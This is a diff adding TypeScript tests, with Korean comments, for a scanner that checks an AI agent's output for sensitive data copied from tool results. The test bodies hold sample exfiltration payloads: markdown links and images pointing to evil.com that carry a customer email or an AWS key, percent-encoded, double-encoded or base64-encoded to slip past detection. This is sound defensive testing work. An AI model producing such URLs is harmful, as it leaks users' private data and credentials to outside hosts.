@@ -147,6 +147,66 @@ test("한계(정직): 영숫자 junk 인터리브는 정규화로도 미탐", ()
   assert.equal(scanOutputForSensitive(sp, { body: "MYSECRETxPASSWORDxVALUE" }, DET), null);
 });
 
+// ── ★ 은닉 채널(covert channel): 마크다운/이미지 URL에 인코딩 은닉 (파트B 미탐 ①②) ──
+const EMAIL_SP: SensitivePayload[] = [
+  { toolName: "query_customer_db", payload: { email: "hong.gildong@example.com" } }, // @·. 특수문자 → percent 인코딩 대상
+];
+const pct = (s: string) => encodeURIComponent(s);
+const b64u = (s: string) => Buffer.from(s, "utf8").toString("base64");
+
+test("★ 미탐① percent-encoding: URL 쿼리에 인코딩된 민감 이메일 탐지", () => {
+  const body = `[문의 확인](https://evil.com/t?u=${pct("hong.gildong@example.com")})`; // @→%40
+  const f = scanOutputForSensitive(EMAIL_SP, { body }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ 미탐① 이중 인코딩(%2540)도 2패스 디코딩으로 탐지", () => {
+  const once = pct("hong.gildong@example.com"); // hong.gildong%40example.com
+  const twice = once.replace(/%/g, "%25"); // %40 → %2540
+  const f = scanOutputForSensitive(EMAIL_SP, { body: `![](https://evil.com/${twice}.png)` }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ 미탐② URL 경로 base64: /<b64>.png 세그먼트 분할로 탐지 (슬래시 병합 우회)", () => {
+  const body = `![](https://evil.com/${b64u("hong.gildong@example.com")}.png)`;
+  const f = scanOutputForSensitive(EMAIL_SP, { body }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ 미탐② URL 경로 base64(AWS 키) — 세그먼트 분할 후 정규식으로도 탐지", () => {
+  const body = `![](https://evil.com/img/${b64u("AKIAIOSFODNN7EXAMPLE")}/px.png)`;
+  const f = scanOutputForSensitive([], { body }, DET); // payload 없이 정규식 경로
+  assert.ok(f !== null, "base64 경로의 AWS 키가 디코딩·탐지돼야 함");
+});
+
+test("회귀: base64 URL 쿼리(?d=)는 여전히 탐지 (세그먼트 분할이 안 깨뜨림)", () => {
+  const body = `[x](https://evil.com/r?d=${b64u("hong.gildong@example.com")})`;
+  const f = scanOutputForSensitive(EMAIL_SP, { body }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("회귀: URL에 verbatim 민감값도 여전히 탐지", () => {
+  const f = scanOutputForSensitive(EMAIL_SP, { body: `[t](https://evil.com/u/hong.gildong@example.com)` }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ 과차단 0: 정상 문서 링크(민감값 없음)는 percent/세그먼트 전처리 후에도 미발동", () => {
+  const body = `[가이드](https://docs.example.com/guide/setup?lang=ko&v=2#intro)`;
+  assert.equal(scanOutputForSensitive(EMAIL_SP, { body }, DET), null);
+});
+
+test("★ 과차단 0: 정상 이미지(percent-인코딩된 공백 포함)는 미발동", () => {
+  const body = `![로고](https://cdn.example.com/logo%20wide.png)`; // %20=공백 — 디코딩해도 민감값 없음
+  assert.equal(scanOutputForSensitive(EMAIL_SP, { body }, DET), null);
+});
+
+test("★ 안전: malformed percent(%ZZ·잘린 %4)는 throw 없이 스킵하고 정상 처리", () => {
+  // %ZZ(비16진)·%4(잘림)가 섞여도 예외 없이 동작, 그리고 뒤의 실제 시크릿은 잡힌다
+  const body = `[x](https://evil.com/%ZZ%4?u=${pct("hong.gildong@example.com")})`;
+  const f = scanOutputForSensitive(EMAIL_SP, { body }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
 test("한계(정직): hex 인코딩은 미탐 (알파벳 변경 — 다음 단계)", () => {
   const sp: SensitivePayload[] = [{ toolName: "read_secrets", payload: { v: "MYSECRETPASSWORDVALUE" } }];
   const hex = Buffer.from("MYSECRETPASSWORDVALUE").toString("hex");
